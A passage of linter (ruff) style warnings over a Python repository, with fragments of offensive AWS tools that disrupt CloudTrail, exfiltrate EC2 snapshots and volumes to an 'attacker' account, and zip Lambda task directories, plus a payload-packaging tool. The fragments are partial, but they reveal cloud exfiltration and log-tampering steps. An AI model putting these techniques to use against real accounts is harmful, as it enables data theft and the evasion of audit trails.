    |                                                      ^^^^
410 |         """
411 |         List vault entries (metadata only, no content).
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> security\black_vault.py:451:28
    |
449 |         return entries
450 |
451 |     def get_stats(self) -> Dict[str, Any]:
    |                            ^^^^
452 |         """
453 |         Get vault statistics.
    |
help: Replace with `dict`

F401 [*] `urllib` imported but unused
  --> security\penetration-testing-tools\clouds\aws\disruptCloudTrailByS3Lambda.py:50:8
   |
48 | import sys
49 | import time
50 | import urllib
   |        ^^^^^^
51 | import zipfile
   |
help: Remove unused import: `urllib`

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\clouds\aws\disruptCloudTrailByS3Lambda.py:251:19
    |
249 |             return False
250 |
251 |         Logger.ok(f"Role created.")
    |                   ^^^^^^^^^^^^^^^^
252 |         Logger.dbg(f"Returned: {out}")
    |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\clouds\aws\disruptCloudTrailByS3Lambda.py:279:19
    |
277 |             return False
278 |
279 |         Logger.ok(f"Policy created.")
    |                   ^^^^^^^^^^^^^^^^^^
280 |         Logger.dbg(f"Returned: {out}")
    |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\clouds\aws\disruptCloudTrailByS3Lambda.py:292:29
    |
290 |         for policy in attached["AttachedPolicies"]:
291 |             if policy["PolicyArn"] == policy_arn:
292 |                 Logger.fail(f"Policy is already attached.")
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
293 |                 return True
    |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\clouds\aws\disruptCloudTrailByS3Lambda.py:302:19
    |
300 |             return False
301 |
302 |         Logger.ok(f"Policy attached.")
    |                   ^^^^^^^^^^^^^^^^^^^
303 |         return True
    |
help: Remove extraneous `f` prefix

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\clouds\aws\disruptCloudTrailByS3Lambda.py:314:33
    |
312 |                 file_blob = file_map.get(file_name)
313 |                 if file_blob is None:
314 |                     Logger.fail("Missing file {} from files".format(file_name))
    |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
315 |                     continue
316 |                 try:
    |
help: Convert to f-string

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\clouds\aws\disruptCloudTrailByS3Lambda.py:365:23
    |
363 |                 Publish=True,
364 |             )
365 |             Logger.ok(f"Function created.")
    |                       ^^^^^^^^^^^^^^^^^^^^
366 |         except Exception as e:
367 |             Logger.fail(f"Could not create a Lambda function: {e}")
    |
help: Remove extraneous `f` prefix

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\clouds\aws\disruptCloudTrailByS3Lambda.py:406:12
    |
404 |         ]
405 |         conf = s3.get_bucket_notification_configuration(Bucket=bucket)
406 |         if "LambdaFunctionConfigurations" in conf.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
407 |             for configuration in conf["LambdaFunctionConfigurations"]:
408 |                 if (
    |
help: Remove `.keys()`

F841 Local variable `out` is assigned to but never used
   --> security\penetration-testing-tools\clouds\aws\disruptCloudTrailByS3Lambda.py:424:13
    |
422 |         out = {}
423 |         try:
424 |             out = s3.put_bucket_notification_configuration(
    |             ^^^
425 |                 Bucket=bucket, NotificationConfiguration=notification_configuration
426 |             )
    |
help: Remove assignment to unused variable `out`

F401 [*] `boto3` imported but unused
   --> security\penetration-testing-tools\clouds\aws\disruptCloudTrailByS3Lambda.py:527:12
    |
525 |     import sys
526 |
527 |     import boto3
    |            ^^^^^
528 |     import botocore
    |
help: Remove unused import: `boto3`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\clouds\aws\disruptCloudTrailByS3Lambda.py:532:50
    |
530 |     try:
531 |         from _pytest.monkeypatch import MonkeyPatch
532 |     except (ImportError, ModuleNotFoundError) as e:
    |                                                  ^
533 |         print('[!] Please install "pytest" first: pip3 install pytest')
534 |         print(
    |
help: Remove assignment to unused variable `e`

F401 [*] `json` imported but unused
  --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:40:8
   |
39 | import argparse
40 | import json
   |        ^^^^
41 | import sys
42 | import time
   |
help: Remove unused import: `json`

F401 [*] `pyjq` imported but unused
  --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:45:8
   |
44 | import boto3
45 | import pyjq
   |        ^^^^
46 | from botocore.exceptions import ClientError
   |
help: Remove unused import: `pyjq`

F401 [*] `botocore.exceptions.ClientError` imported but unused
  --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:46:33
   |
44 | import boto3
45 | import pyjq
46 | from botocore.exceptions import ClientError
   |                                 ^^^^^^^^^^^
47 |
48 | config = {
   |
help: Remove unused import: `botocore.exceptions.ClientError`

F841 Local variable `modify_result` is assigned to but never used
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:177:13
    |
175 |         )
176 |         try:
177 |             modify_result = victim_client.modify_snapshot_attribute(
    |             ^^^^^^^^^^^^^
178 |                 Attribute=f"createVolumePermission",
179 |                 OperationType="add",
    |
help: Remove assignment to unused variable `modify_result`

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:178:27
    |
176 |         try:
177 |             modify_result = victim_client.modify_snapshot_attribute(
178 |                 Attribute=f"createVolumePermission",
    |                           ^^^^^^^^^^^^^^^^^^^^^^^^^
179 |                 OperationType="add",
180 |                 SnapshotId=snapshot["SnapshotId"],
    |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:193:20
    |
191 |             )
192 |
193 |         Logger.out(f"Step 3: Waiting for the snapshot to transit into completed state.")
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
194 |         try:
195 |             victim_client.get_waiter("snapshot_completed").wait(
    |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:249:20
    |
247 |             Logger.fail(f"ec2:CreateVolume action on Attacker failed. Exception: {e}")
248 |
249 |         Logger.out(f"Step 5: Waiting for the volume to transit into created state.")
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
250 |         try:
251 |             attacker_client.get_waiter("volume_available").wait(
    |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:261:13
    |
260 |         Logger.out(
261 |             f"Step 6: Attaching created EBS volume to Attacker's specified EC2 instance"
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
262 |         )
263 |         try:
    |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:307:33
    |
305 |                         "Tried to automatically stop attacker's EC2 instance, then attach volume and restart it, but that failed as wΓÇª
306 |                     )
307 |                     Logger.fail(f"Exception: " + str(e))
    |                                 ^^^^^^^^^^^^^^
308 |
309 |                 Logger.info("Restarting it...")
    |
help: Remove extraneous `f` prefix

E722 Do not use bare `except`
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:331:17
    |
329 |                             attacker_instance_data = inst
330 |                             break
331 |                 except:
    |                 ^^^^^^
332 |                     pass
333 |             else:
    |

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:343:23
    |
341 |             )
342 |             victim_client.delete_snapshot(SnapshotId=snapshot["SnapshotId"])
343 |             Logger.ok(f"Snapshot removed.")
    |                       ^^^^^^^^^^^^^^^^^^^^
344 |         except Exception as e:
345 |             Logger.fail(
    |
help: Remove extraneous `f` prefix

E722 Do not use bare `except`
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:353:13
    |
351 |             try:
352 |                 ip = attacker_instance_data["PublicIpAddress"]
353 |             except:
    |             ^^^^^^
354 |                 Logger.fail(
355 |                     f"Could not obtain Attacker's EC2 Public ip address. Available fields:\n {attacker_instance_data}\n"
    |

W291 Trailing whitespace
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:383:37
    |
381 |     AvailibityZone = {availability_zone}
382 |
383 | Most likely as a '/dev/xvdf' device. 
    |                                     ^
384 |
385 | ===============================================================
    |
help: Remove trailing whitespace

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:391:1
    |
389 |     1) List block devices mapped:
390 |         # lsblk
391 |     
    | ^^^^
392 |     2) If above listing yielded mapped block device, e.g. xvdf, create a directory for it:
393 |         # mkdir /exfiltrated
    |
help: Remove whitespace from blank line

F841 Local variable `attacker_client` is assigned to but never used
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:406:9
    |
404 |     def create_image(self, instance_id, image_name, image_description):
405 |         victim_client = self.session["victim"].client("ec2")
406 |         attacker_client = self.session["attacker"].client("ec2")
    |         ^^^^^^^^^^^^^^^
407 |
408 |         created_image = None
    |
help: Remove assignment to unused variable `attacker_client`

F841 Local variable `modify_result` is assigned to but never used
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:427:13
    |
425 |         )
426 |         try:
427 |             modify_result = victim_client.modify_image_attribute(
    |             ^^^^^^^^^^^^^
428 |                 Attribute="launchPermission",
429 |                 ImageId=created_image["ImageId"],
    |
help: Remove assignment to unused variable `modify_result`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:607:32
    |
606 |     if args.method == "createimage":
607 |         if args.instance_id != None:
    |                                ^^^^
608 |             config["instance-id"] = args.instance_id
609 |         else:
    |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:613:30
    |
612 |     if args.method == "createsnapshot":
613 |         if args.volume_id != None and args.attach_instance_id != None:
    |                              ^^^^
614 |             config["volume-id"] = args.volume_id
615 |             config["attach-instance-id"] = args.attach_instance_id
    |
help: Replace with `cond is not None`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:613:66
    |
612 |     if args.method == "createsnapshot":
613 |         if args.volume_id != None and args.attach_instance_id != None:
    |                                                                  ^^^^
614 |             config["volume-id"] = args.volume_id
615 |             config["attach-instance-id"] = args.attach_instance_id
    |
help: Replace with `cond is not None`

F401 [*] `boto3` imported but unused
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:679:12
    |
677 |     import sys
678 |
679 |     import boto3
    |            ^^^^^
680 |     import botocore
    |
help: Remove unused import: `boto3`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\clouds\aws\exfiltrate-ec2.py:684:50
    |
682 |     try:
683 |         from _pytest.monkeypatch import MonkeyPatch
684 |     except (ImportError, ModuleNotFoundError) as e:
    |                                                  ^
685 |         print('[!] Please install "pytest" first: pip3 install pytest')
686 |         print(
    |
help: Remove assignment to unused variable `e`

F401 [*] `sys` imported but unused
  --> security\penetration-testing-tools\clouds\aws\exfiltrateLambdaTasksDirectory.py:18:8
   |
16 | import os
17 | import ssl
18 | import sys
   |        ^^^
19 | import urllib
20 | import zipfile
   |
help: Remove unused import: `sys`

UP004 [*] Class `InMemoryZip` inherits from `object`
  --> security\penetration-testing-tools\clouds\aws\exfiltrateLambdaTasksDirectory.py:32:19
   |
32 | class InMemoryZip(object):
   |                   ^^^^^^
33 |     # Source:
34 |     #   - https://www.kompato.com/post/43805938842/in-memory-zip-in-python
   |
help: Remove `object` inheritance

B007 Loop control variable `subs` not used within loop body
  --> security\penetration-testing-tools\clouds\aws\exfiltrateLambdaTasksDirectory.py:54:17
   |
53 | def fetch_files(imz, rootdir):
54 |     for folder, subs, files in os.walk(rootdir):
   |                 ^^^^
55 |         for filename in files:
56 |             real_path = os.path.join(folder, filename)
   |
help: Rename unused `subs` to `_subs`

UP015 [*] Unnecessary mode argument
  --> security\penetration-testing-tools\clouds\aws\exfiltrateLambdaTasksDirectory.py:57:34
   |
55 |         for filename in files:
56 |             real_path = os.path.join(folder, filename)
57 |             with open(real_path, "r") as src:
   |                                  ^^^
58 |                 zip_path = real_path.replace(rootdir + "/", "")
59 |                 imz.append(zip_path, src.read())
   |
help: Remove mode argument

E722 Do not use bare `except`
  --> security\penetration-testing-tools\clouds\aws\exfiltrateLambdaTasksDirectory.py:89:1
   |
87 | try:
88 |     main()
89 | except:
   | ^^^^^^
90 |     pass
   |

F401 [*] `glob` imported but unused
 --> security\penetration-testing-tools\file-formats\PackMyPayload\PackMyPayload.py:4:8
  |
3 | import argparse
4 | import glob
  |        ^^^^
5 | import os
6 | import random
  |
help: Remove unused import: `glob`

F401 [*] `random` imported but unused
 --> security\penetration-testing-tools\file-formats\PackMyPayload\PackMyPayload.py:6:8
  |
4 | import glob
5 | import os
6 | import random
  |        ^^^^^^
7 | import re
8 | import string
  |
help: Remove unused import: `random`

F401 [*] `re` imported but unused
 --> security\penetration-testing-tools\file-formats\PackMyPayload\PackMyPayload.py:7:8
  |
5 | import os
6 | import random
7 | import re
  |        ^^
8 | import string
9 | import sys
  |
help: Remove unused import: `re`

F401 [*] `string` imported but unused
  --> security\penetration-testing-tools\file-formats\PackMyPayload\PackMyPayload.py:8:8
   |
 6 | import random
 7 | import re
 8 | import string
   |        ^^^^^^
 9 | import sys
10 | import textwrap
   |
help: Remove unused import: `string`

N816 Variable `globalOpts` in global scope should not be mixedCase
  --> security\penetration-testing-tools\file-formats\PackMyPayload\PackMyPayload.py:15:1
   |
13 | import lib.packager
14 |
15 | globalOpts = {
   | ^^^^^^^^^^
16 |     "verbose": True,
17 |     "debug": True,
   |

B007 Loop control variable `b` not used within loop body
  --> security\penetration-testing-tools\file-formats\PackMyPayload\PackMyPayload.py:47:12
   |
45 |     formats = ""
46 |
47 |     for a, b in lib.packager.Packager.formatsMap.items():
   |            ^
48 |         formats += f"\t- {a}\n"
   |
help: Rename unused `b` to `_b`

N806 Variable `outputFormat` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\PackMyPayload.py:180:5
    |
178 |     packager = lib.packager.Packager(logger, globalOpts)
179 |
180 |     outputFormat = ""
    |     ^^^^^^^^^^^^
181 |     if args.out_format != "":
182 |         outputFormat = packager.getFormat("foo." + args.out_format)
    |

N806 Variable `outputFormat` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\PackMyPayload.py:182:9
    |
180 |     outputFormat = ""
181 |     if args.out_format != "":
182 |         outputFormat = packager.getFormat("foo." + args.out_format)
    |         ^^^^^^^^^^^^
183 |
184 |     else:
    |

N806 Variable `outputFormat` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\PackMyPayload.py:185:9
    |
184 |     else:
185 |         outputFormat = packager.getFormat(args.outfile)
    |         ^^^^^^^^^^^^
186 |
187 |     filepath, fileext = os.path.splitext(args.outfile)
    |

E722 Do not use bare `except`
  --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:14:1
   |
12 | try:
13 |     colorama.init()
14 | except:
   | ^^^^^^
15 |     pass
   |

SIM118 Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:66:16
   |
64 |             return txt
65 |
66 |         if not col in Logger.colors_map.keys():
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
67 |             col = Logger.DefaultColor
   |
help: Remove `.keys()`

E713 [*] Test for membership should be `not in`
  --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:66:16
   |
64 |             return txt
65 |
66 |         if not col in Logger.colors_map.keys():
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
67 |             col = Logger.DefaultColor
   |
help: Convert to `not in`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:110:9
    |
108 |           txt = txt.lstrip()
109 |
110 | /         if (
111 | |             len(txt) > n + 4
112 | |             and txt[n + 0] == "["
113 | |             and txt[n + 2] == "]"
114 | |             and txt[n + 3] == " "
115 | |         ):
116 | |             if (
117 | |                 "color" not in kwargs.keys()
118 | |                 or kwargs["color"] == ""
119 | |                 or kwargs["color"] == "none"
120 | |             ):
121 | |                 if "nocolor" not in kwargs.keys() or not kwargs["nocolor"]:
    | |___________________________________________________________________________^
122 |                       aux = Logger.DefaultColor
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:116:13
    |
114 |               and txt[n + 3] == " "
115 |           ):
116 | /             if (
117 | |                 "color" not in kwargs.keys()
118 | |                 or kwargs["color"] == ""
119 | |                 or kwargs["color"] == "none"
120 | |             ):
121 | |                 if "nocolor" not in kwargs.keys() or not kwargs["nocolor"]:
    | |___________________________________________________________________________^
122 |                       aux = Logger.DefaultColor
    |
help: Combine `if` statements using `and`

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:117:17
    |
115 |         ):
116 |             if (
117 |                 "color" not in kwargs.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
118 |                 or kwargs["color"] == ""
119 |                 or kwargs["color"] == "none"
    |
help: Remove `.keys()`

SIM118 [*] Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:121:20
    |
119 |                 or kwargs["color"] == "none"
120 |             ):
121 |                 if "nocolor" not in kwargs.keys() or not kwargs["nocolor"]:
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
122 |                     aux = Logger.DefaultColor
    |
help: Remove `.keys()`

SIM114 [*] Combine `if` branches using logical `or` operator
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:128:21
    |
126 |                       elif txt[n + 1] == "+":
127 |                           aux = "green"
128 | /                     elif txt[n + 1] == "-":
129 | |                         aux = "red"
130 | |                     elif txt[n + 1] == "!":
131 | |                         aux = "red"
    | |___________________________________^
132 |                       elif txt[n + 1] == "?":
133 |                           aux = "yellow"
    |
help: Combine `if` branches

SIM116 Use a dictionary instead of consecutive `if` statements
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:151:9
    |
149 |       def mode_translate(mode):
150 |           mode = mode.lower().strip()
151 | /         if mode == "info":
152 | |             return "."
153 | |         elif mode == "debug":
154 | |             return "#"
155 | |         elif mode == "error":
156 | |             return "-"
157 | |         elif mode == "fatal":
158 | |             return "fatal"
    | |__________________________^
159 |
160 |           return mode
    |

F841 Local variable `output` is assigned to but never used
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:164:9
    |
162 |     @staticmethod
163 |     def out(txt, fd, mode="info", **kwargs):
164 |         output = ""
    |         ^^^^^^
165 |
166 |         if type(txt) is not str:
    |
help: Remove assignment to unused variable `output`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:210:14
    |
208 |             col = args["color"]
209 |
210 |         elif mode in Logger.colors_map.keys():
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
211 |             col = mode
    |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:213:14
    |
211 |             col = mode
212 |
213 |         elif mode in Logger.colors_dict.keys():
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
214 |             col = Logger.colors_dict[mode]
    |
help: Remove `.keys()`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:223:9
    |
222 |           nl = ""
223 | /         if "newline" in args:
224 | |             if args["newline"]:
    | |_______________________________^
225 |                   nl = "\n"
    |
help: Combine `if` statements using `and`

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:230:12
    |
228 |             fd = sys.stdout
229 |
230 |         if "noPrefix" in kwargs.keys() and kwargs["noPrefix"]:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^
231 |             prefix = ""
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:235:12
    |
233 |         line = ""
234 |
235 |         if type(fd) == str:
    |            ^^^^^^^^^^^^^^^
236 |             if len(txt) == 0:
237 |                 line = nl
    |

SIM108 Use ternary operator `line = nl if len(txt) == 0 else prefix + txt + nl` instead of `if`-`else`-block
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:236:13
    |
235 |           if type(fd) == str:
236 | /             if len(txt) == 0:
237 | |                 line = nl
238 | |             else:
239 | |                 line = prefix + txt + nl
    | |________________________________________^
240 |           else:
241 |               if len(txt) == 0:
    |
help: Replace `if`-`else`-block with `line = nl if len(txt) == 0 else prefix + txt + nl`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:258:12
    |
256 |     @staticmethod
257 |     def rawWrite(fd, line):
258 |         if type(fd) == str:
    |            ^^^^^^^^^^^^^^^
259 |             with open(fd, "a", encoding="utf8") as f:
260 |                 f.write(line)
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:263:17
    |
261 |                 try:
262 |                     f.flush()
263 |                 except:
    |                 ^^^^^^
264 |                     pass
265 |         else:
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:269:13
    |
267 |             try:
268 |                 fd.flush()
269 |             except:
    |             ^^^^^^
270 |                 pass
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:281:17
    |
279 |             forced
280 |             or (self.options["verbose"] or self.options.get("debug", False))
281 |             or (type(self.options["log"]) == str and self.options["log"] != "none")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
282 |         ):
283 |             Logger.out(txt, self.options["log"], "info", **kwargs)
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\logger.py:323:5
    |
321 |     try:
322 |         colorama.deinit()
323 |     except:
    |     ^^^^^^
324 |         pass
    |

F401 [*] `base64` imported but unused
  --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:12:8
   |
10 | #
11 |
12 | import base64
   |        ^^^^^^
13 | import csv
14 | import ctypes
   |
help: Remove unused import: `base64`

F401 [*] `sys` imported but unused
  --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:22:8
   |
20 | import string
21 | import subprocess
22 | import sys
   |        ^^^
23 | import tempfile
24 | import time
   |
help: Remove unused import: `sys`

F401 [*] `traceback` imported but unused
  --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:25:8
   |
23 | import tempfile
24 | import time
25 | import traceback
   |        ^^^^^^^^^
26 | import zipfile
   |
help: Remove unused import: `traceback`

F401 [*] `io.BytesIO` imported but unused
  --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:47:20
   |
45 |     from cStringIO import StringIO as BytesIO
46 | except ImportError:
47 |     from io import BytesIO
   |                    ^^^^^^^
48 |
49 | try:
   |
help: Remove unused import: `io.BytesIO`

F401 `msilib` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:50:12
   |
49 | try:
50 |     import msilib
   |            ^^^^^^
51 |
52 |     MSILIB_LOADED = True
   |
help: Remove unused import: `msilib`

N815 Variable `formatsMap` in class scope should not be mixedCase
  --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:73:5
   |
72 | class Packager:
73 |     formatsMap = {
   |     ^^^^^^^^^^
74 |         # Working fine
75 |         "zip": "zipfile",
   |

N815 Variable `diskpartCreateVHD` in class scope should not be mixedCase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:333:5
    |
331 |     ]
332 |
333 |     diskpartCreateVHD = getFactoryPath("templates/diskpart-create-vhd.txt")
    |     ^^^^^^^^^^^^^^^^^
334 |     diskpartDetachVHD = getFactoryPath("templates/diskpart-detach-vhd.txt")
335 |     diskpartMountVHD = getFactoryPath("templates/diskpart-mount-vhd.txt")
    |

N815 Variable `diskpartDetachVHD` in class scope should not be mixedCase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:334:5
    |
333 |     diskpartCreateVHD = getFactoryPath("templates/diskpart-create-vhd.txt")
334 |     diskpartDetachVHD = getFactoryPath("templates/diskpart-detach-vhd.txt")
    |     ^^^^^^^^^^^^^^^^^
335 |     diskpartMountVHD = getFactoryPath("templates/diskpart-mount-vhd.txt")
336 |     getMountedVHDDrive = getFactoryPath("templates/Get-MountedVHDDrive.ps1")
    |

N815 Variable `diskpartMountVHD` in class scope should not be mixedCase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:335:5
    |
333 |     diskpartCreateVHD = getFactoryPath("templates/diskpart-create-vhd.txt")
334 |     diskpartDetachVHD = getFactoryPath("templates/diskpart-detach-vhd.txt")
335 |     diskpartMountVHD = getFactoryPath("templates/diskpart-mount-vhd.txt")
    |     ^^^^^^^^^^^^^^^^
336 |     getMountedVHDDrive = getFactoryPath("templates/Get-MountedVHDDrive.ps1")
    |

N815 Variable `getMountedVHDDrive` in class scope should not be mixedCase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:336:5
    |
334 |     diskpartDetachVHD = getFactoryPath("templates/diskpart-detach-vhd.txt")
335 |     diskpartMountVHD = getFactoryPath("templates/diskpart-mount-vhd.txt")
336 |     getMountedVHDDrive = getFactoryPath("templates/Get-MountedVHDDrive.ps1")
    |     ^^^^^^^^^^^^^^^^^^
337 |
338 |     def __init__(self, logger, options):
    |

SIM103 Return the condition `Packager.getFormat(infile) != ""` directly
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:360:9
    |
358 |       @staticmethod
359 |       def isFileExtensionSupported(infile):
360 | /         if Packager.getFormat(infile) != "":
361 | |             return True
362 | |         return False
    | |____________________^
363 |
364 |       @staticmethod
    |
help: Replace with `return Packager.getFormat(infile) != ""`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:369:12
    |
367 |         fileext = fileext[1:]
368 |
369 |         if fileext in Packager.formatsMap.keys():
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
370 |             return Packager.formatsMap[fileext]
    |
help: Remove `.keys()`

N806 Variable `CREATE_NO_WINDOW` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:381:9
    |
379 |     @staticmethod
380 |     def shell(cmd, cwd=""):
381 |         CREATE_NO_WINDOW = 0x08000000
    |         ^^^^^^^^^^^^^^^^
382 |         si = subprocess.STARTUPINFO()
383 |         si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    |

N803 Argument name `outputFormat` should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:415:40
    |
413 |         return status
414 |
415 |     def package(self, infile, outfile, outputFormat):
    |                                        ^^^^^^^^^^^^
416 |         if not outputFormat:
417 |             self.logger.fatal(
    |

N806 Variable `outputFormat` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:424:17
    |
422 |         elif outputFormat == "auto":
423 |             if len(outfile) > 0:
424 |                 outputFormat = Packager.getFormat(outfile)
    |                 ^^^^^^^^^^^^
425 |             elif (
426 |                 "out_format" in self.options.keys()
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:426:17
    |
424 |                 outputFormat = Packager.getFormat(outfile)
425 |             elif (
426 |                 "out_format" in self.options.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
427 |                 and len(self.options["out_format"]) > 0
428 |             ):
    |
help: Remove `.keys()`

N806 Variable `outputFormat` in function should be lowercase
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:429:17
    |
427 |                 and len(self.options["out_format"]) > 0
428 |             ):
429 |                 outputFormat = Packager.getFormat(self.options["out_format"])
    |                 ^^^^^^^^^^^^
430 |             else:
431 |                 self.logger.fatal(
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:444:12
    |
442 |         output = False
443 |
444 |         if "filename" in self.options.keys() and len(self.options["filename"]) > 0:
    |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
445 |             self.fileName = self.options["filename"]
446 |             self.logger.info(f"Will package input file into output archive under name:")
    |
help: Remove `.keys()`

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\file-formats\PackMyPayload\lib\packager.py:446:30
    |
444 |         if "filename" in self.options.keys() and len(self.options["filename"]) > 0:
